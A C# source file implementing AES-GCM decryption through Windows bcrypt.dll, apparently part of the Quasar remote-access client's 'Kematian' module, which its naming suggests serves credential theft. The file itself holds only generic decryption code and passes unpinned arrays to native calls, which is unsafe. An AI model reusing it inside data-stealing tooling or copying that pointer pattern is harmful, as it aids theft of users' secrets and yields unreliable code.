using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Quasar.Client.Kematian.HelpingMethods.Decryption
{
    class AesGcmDecryptor
    {
        private const string BCRYPT_AES_ALGORITHM = "AES";
        private const string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
        private const int STATUS_SUCCESS = 0;

        [DllImport("bcrypt.dll")]
        private static extern int BCryptOpenAlgorithmProvider(
            out IntPtr phAlgorithm,
            string pszAlgId,
            string pszImplementation,
            int dwFlags);

        [DllImport("bcrypt.dll")]
        private static extern int BCryptSetProperty(
            IntPtr hObject,
            string pszProperty,
            byte[] pbInput,
            int cbInput,
            int dwFlags);

        [DllImport("bcrypt.dll")]
        private static extern int BCryptGenerateSymmetricKey(
            IntPtr hAlgorithm,
            out IntPtr phKey,
            IntPtr pbKeyObject,
            int cbKeyObject,
            byte[] pbSecret,
            int cbSecret,
            int dwFlags);

        [DllImport("bcrypt.dll")]
        private static extern int BCryptDecrypt(
            IntPtr hKey,
            byte[] pbInput,
            int cbInput,
            ref BCryptAuthInfo pPaddingInfo,
            byte[] pbIV,
            int cbIV,
            byte[] pbOutput,
            int cbOutput,
            out int pcbResult,
            int dwFlags);

        [DllImport("bcrypt.dll")]
        private static extern int BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll")]
        private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);

        [StructLayout(LayoutKind.Sequential)]
        private struct BCryptAuthInfo
        {
            public int cbSize;
            public IntPtr pbNonce;
            public int cbNonce;
            public IntPtr pbAuthData;
            public int cbAuthData;
            public IntPtr pbTag;
            public int cbTag;
            public IntPtr pbMacContext;
            public int cbMacContext;
            public int cbAADSize;
            public int dwFlags;
        }

        public static byte[] DecryptAesGcm(byte[] encryptedData, byte[] key, byte[] nonce, byte[] tag)
        {
            if (key == null || key.Length != 32) // 256-bit key
                throw new ArgumentException("Invalid key length. Key must be 32 bytes (256 bits).", nameof(key));

            if (nonce == null || nonce.Length == 0)
                throw new ArgumentException("Nonce is required.", nameof(nonce));

            if (tag == null || tag.Length != 16) // 128-bit tag
                throw new ArgumentException("Invalid tag length. Tag must be 16 bytes (128 bits).", nameof(tag));

            IntPtr hAlgorithm = IntPtr.Zero;
            IntPtr hKey = IntPtr.Zero;

            try
            {
                // Open AES algorithm provider
                int status = BCryptOpenAlgorithmProvider(out hAlgorithm, BCRYPT_AES_ALGORITHM, null, 0);
                if (status != STATUS_SUCCESS)
                    throw new CryptographicException($"Failed to open AES algorithm provider. Status: {status}");

                // Set GCM chaining mode
                byte[] gcmMode = System.Text.Encoding.Unicode.GetBytes(BCRYPT_CHAIN_MODE_GCM);
                status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAIN_MODE_GCM, gcmMode, gcmMode.Length, 0);
                if (status != STATUS_SUCCESS)
                    throw new CryptographicException($"Failed to set GCM chaining mode. Status: {status}");

                // Generate symmetric key
                status = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
                if (status != STATUS_SUCCESS)
                    throw new CryptographicException($"Failed to generate symmetric key. Status: {status}");

                // Prepare authentication info
                BCryptAuthInfo authInfo = new BCryptAuthInfo
                {
                    cbSize = Marshal.SizeOf<BCryptAuthInfo>(),
                    pbNonce = Marshal.UnsafeAddrOfPinnedArrayElement(nonce, 0),
                    cbNonce = nonce.Length,
                    pbTag = Marshal.UnsafeAddrOfPinnedArrayElement(tag, 0),
                    cbTag = tag.Length,
                };

                // Decrypt data
                byte[] plainText = new byte[encryptedData.Length];
                status = BCryptDecrypt(hKey, encryptedData, encryptedData.Length, ref authInfo, null, 0, plainText, plainText.Length, out int resultSize, 0);
                if (status != STATUS_SUCCESS)
                    throw new CryptographicException($"Decryption failed. Status: {status}");

                Array.Resize(ref plainText, resultSize);
                return plainText;
            }
            finally
            {
                if (hKey != IntPtr.Zero)
                    BCryptDestroyKey(hKey);
                if (hAlgorithm != IntPtr.Zero)
                    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
            }
        }
    }

}
